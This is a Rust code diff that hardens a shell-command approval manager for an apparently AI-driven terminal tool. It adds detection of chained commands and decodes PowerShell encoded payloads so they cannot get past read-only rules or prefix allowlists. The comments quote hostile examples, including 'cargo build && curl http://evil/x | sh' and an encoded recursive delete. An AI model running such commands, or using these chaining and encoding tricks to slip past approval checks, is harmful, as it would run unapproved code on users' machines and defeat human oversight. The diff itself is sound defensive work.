@@ -26,6 +26,56 @@ fn command_signature(command: &str) -> String {
     command.split_whitespace().collect::<Vec<_>>().join(" ")
 }
 
+/// 命令里是否有**串接第二个命令**的语法。
+///
+/// 给「前缀白名单」划边界用：`^cargo\b.*` 匹配的是整串命令的开头，
+/// `cargo build && curl http://evil/x | sh` 也以 `cargo` 开头，但真正执行的
+/// 是第二个命令。引号内的内容先被抹掉 —— `git commit -m "fix: a; b"` 不是链式。
+pub(super) fn has_command_chaining(command: &str) -> bool {
+    let bare = strip_quoted(command);
+    bare.contains("&&")
+        || bare.contains("||")
+        || bare.contains(';')
+        || bare.contains('|')
+        || bare.contains('>')
+        || bare.contains('<')
+        || bare.contains('`')
+        || bare.contains("$(")
+}
+
+/// 把引号（含单/双引号）内的字符替换成空格，保留引号外的字符位置。
+///
+/// 不做真正的 shell 词法分析：只为「引号里的 `;` 不算命令分隔符」这一个用途服务。
+/// 未闭合的引号按「后面全是引用内容」处理（比反向假设更保守）。
+fn strip_quoted(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    let mut quote: Option<char> = None;
+    let mut escaped = false;
+    for c in s.chars() {
+        match quote {
+            Some(q) => {
+                if escaped {
+                    escaped = false;
+                } else if c == '\\' {
+                    escaped = true;
+                } else if c == q {
+                    quote = None;
+                }
+                out.push(' ');
+            }
+            None => {
+                if c == '"' || c == '\'' {
+                    quote = Some(c);
+                    out.push(' ');
+                } else {
+                    out.push(c);
+                }
+            }
+        }
+    }
+    out
+}
+
 // ---------------------------------------------------------------------------
 // ApprovalDecision
 // ---------------------------------------------------------------------------
@@ -459,15 +509,42 @@ impl ApprovalManager {
             }
         }
 
+        // 1a. 编码载荷（`powershell -EncodedCommand <base64>`）。2026-09-26 的裁决
+        //     是「编码本身不审批，只有删除等高危才审批」，但此前只落实了前半句：
+        //     载荷从不被解码，于是 `Remove-Item -Recurse -Force` 编码之后连
+        //     DENIED 都不命中。这里只做**加严** —— 明文命中 DENIED 就拒、命中
+        //     CONFIRM 就强制确认；「编码这个动作」仍然不弹卡。
+        let encoded_payload = super::encoded::decode_powershell_encoded(command);
+        if let Some(payload) = encoded_payload.as_deref() {
+            if DENIED_PATTERNS.iter().any(|re| re.is_match(payload))
+                || self.denied_patterns.iter().any(|re| re.is_match(payload))
+            {
+                return ApprovalDecision::Denied;
+            }
+        }
+        let encoded_needs_confirmation = encoded_payload
+            .as_deref()
+            .is_some_and(|payload| self.match_confirm_rule(payload).is_some());
+
         // 1b. Read-only patterns — these commands have no side effects
         // and are always allowed, even if a CONFIRM_PATTERN would
         // otherwise match. Checked AFTER denied patterns (so a
         // catastrophic command is never downgraded) but BEFORE
         // session/confirm checks so read-only exploration never
         // triggers an approval prompt.
-        for re in READONLY_PATTERNS.iter() {
-            if re.is_match(command) {
-                return ApprovalDecision::Approved;
+        // 编码载荷里藏着确认类命令时，只读规则不得把它洗白：
+        // `powershell -Command "Get-Item x" -EncodedCommand <删除脚本>` 的前半段
+        // 会命中 READONLY，但真正执行的是载荷。
+        //
+        // 链式命令同理：READONLY_PATTERNS 是「整串里出现只读词」匹配，
+        // `sudo apt install foo; ls` 的尾部 `ls` 就能让整条命令被判为只读。
+        // 单一命令才走快速放行；链式命令落到下面的 confirm 检查，
+        // 全只读的组合仍会因「无 confirm 命中」被判 Approved。
+        if !encoded_needs_confirmation && !has_command_chaining(command) {
+            for re in READONLY_PATTERNS.iter() {
+                if re.is_match(command) {
+                    return ApprovalDecision::Approved;
+                }
             }
         }
 
@@ -487,7 +564,9 @@ impl ApprovalManager {
         //    even though they are the same family.
         // 守卫而非记忆键：命中与否决定要不要走后面的检查（不命中 = 隐式
 // 放行）。会话记忆的 key 是下面的 `command_signature(command)`。
-        if self.match_confirm_rule(command).is_none() {
+        let needs_confirmation =
+            self.match_confirm_rule(command).is_some() || encoded_needs_confirmation;
+        if !needs_confirmation {
             // No confirm rule matched → implicit allowlist.
             return ApprovalDecision::Approved;
         }
@@ -512,9 +591,15 @@ impl ApprovalManager {
         //    enough to skip the prompt next time" decision.
         //    Shell-rule evaluation always uses the `terminal` tool
         //    (the engine runs only on shell commands).
-        if let Some(al) = &self.user_allowlist {
-            if al.matches("terminal", command) {
-                return ApprovalDecision::Approved;
+        //
+        //    只对**单一命令**生效：白名单签名是命令前缀（`^cargo\b.*`），
+        //    对 `cargo build && curl http://evil/x | sh` 降级等于把一次点击
+        //    放大成「cargo 开头的一切」——链式部分完全没经过任何规则。
+        if !encoded_needs_confirmation && !has_command_chaining(command) {
+            if let Some(al) = &self.user_allowlist {
+                if al.matches("terminal", command) {
+                    return ApprovalDecision::Approved;
+                }
             }
         }
 
@@ -572,6 +657,19 @@ impl ApprovalManager {
             }
         }
 
+        // 编码载荷加严（与 `check_approval` 同一条规则，配对设备不能绕过）。
+        let encoded_payload = super::encoded::decode_powershell_encoded(command);
+        if let Some(payload) = encoded_payload.as_deref() {
+            if DENIED_PATTERNS.iter().any(|re| re.is_match(payload))
+                || self.denied_patterns.iter().any(|re| re.is_match(payload))
+            {
+                return ApprovalDecision::Denied;
+            }
+        }
+        let encoded_needs_confirmation = encoded_payload
+            .as_deref()
+            .is_some_and(|payload| self.match_confirm_rule(payload).is_some());
+
         if matches!(origin, Origin::Unpaired) {
             return ApprovalDecision::Denied;
         }
@@ -582,9 +680,13 @@ impl ApprovalManager {
                 if !scopes.contains(&Capability::DangerousTool) {
                     // 未配 DangerousTool：shell 类高危命令直接拒绝。
                     // 读日志（READONLY_PATTERNS）放行——那是 Chat 级语义。
-                    for re in READONLY_PATTERNS.iter() {
-                        if re.is_match(command) {
-                            return ApprovalDecision::Approved;
+                    // 编码载荷里的确认类命令、以及链式命令都不享受这个放行
+                    // （理由同 `check_approval` 的 1b 节）。
+                    if !encoded_needs_confirmation && !has_command_chaining(command) {
+                        for re in READONLY_PATTERNS.iter() {
+                            if re.is_match(command) {
+                                return ApprovalDecision::Approved;
+                            }
                         }
                     }
                     return ApprovalDecision::Denied;
@@ -594,9 +696,11 @@ impl ApprovalManager {
             // 维持矩阵的 NeedsLocalConfirmation 语义 → 需桌面端确认。
         }
 
-        for re in READONLY_PATTERNS.iter() {
-            if re.is_match(command) {
-                return ApprovalDecision::Approved;
+        if !encoded_needs_confirmation && !has_command_chaining(command) {
+            for re in READONLY_PATTERNS.iter() {
+                if re.is_match(command) {
+                    return ApprovalDecision::Approved;
+                }
             }
         }
 
